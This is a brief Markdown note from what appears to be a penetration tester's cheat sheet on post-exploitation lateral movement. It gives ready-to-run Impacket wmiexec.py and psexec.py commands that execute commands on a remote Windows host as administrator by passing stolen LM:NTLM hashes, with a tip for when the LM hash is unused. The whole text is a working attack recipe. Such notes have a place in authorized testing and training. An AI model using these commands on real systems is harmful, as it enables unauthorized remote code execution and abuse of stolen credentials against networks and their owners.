---
tags: [PostEx]
title: PostEx/WmiExec and PSExec
created: '2020-01-04T23:03:37.609Z'
modified: '2020-01-04T23:18:01.491Z'
---

# PostEx/WmiExec and PSExec
Execute commands on remote machines with valid creds or by passing the hash. If the LM is unused (most of the time) just use the NTLM hash twice
```
wmiexec.py administrator@<target> -hashes <LM Hash>:<NTLM Hash>
```
```
psexec.py administrator@<target> -hashes <LM Hash>:<NTLM Hash>
```
